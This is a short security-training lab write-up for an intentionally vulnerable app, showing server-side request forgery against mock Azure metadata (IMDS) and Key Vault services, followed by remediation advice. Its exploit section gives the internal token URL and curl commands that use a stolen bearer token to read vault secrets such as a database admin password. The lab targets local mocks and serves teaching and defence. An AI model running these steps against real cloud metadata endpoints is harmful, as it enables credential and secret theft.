# Lab 02: SSRF to IMDS and Key Vault

The link-preview tool fetches any URL from the app container, so it can reach Docker-network mocks for Azure IMDS and Key Vault.

**OWASP Top 10:2025:** [A01 Broken Access Control](https://owasp.org/Top10/2025/) (SSRF; also related to A02)

**Code:** `app/routes/tools.py` (`preview`); mocks in `mocks/imds/`, `mocks/keyvault/`

## Exploit

1. Sign in (e.g. alice / alice123). Open **Preview** → `/tools/preview`.
2. POST this URL:

```text
http://imds:8090/metadata/identity/oauth2/token
```

3. Copy `access_token` from the JSON (default over-privileged token looks like `imds-token-OVERPRIVILEGED-can-read-all-secrets`).
4. From the web container, call Key Vault with that Bearer token:

```bash
docker compose exec web curl -s \
  -H "Authorization: Bearer imds-token-OVERPRIVILEGED-can-read-all-secrets" \
  http://keyvault:8091/secrets
```

```bash
docker compose exec web curl -s \
  -H "Authorization: Bearer imds-token-OVERPRIVILEGED-can-read-all-secrets" \
  http://keyvault:8091/secrets/db-admin-password
```

Optional contrast: add `?client_id=11111111-2222-3333-4444-555555555555` on the IMDS URL for a scoped token that cannot read `db-admin-password`.

## Fix

- Allowlist schemes and external hosts; block private / link-local ranges and internal DNS names.
- Re-validate after redirects; prefer an egress proxy with a fixed allowlist.
- On cloud: least-privilege managed identities (no vault-wide reader on a public web role).

See `SAFE:` comments in `tools.py`.
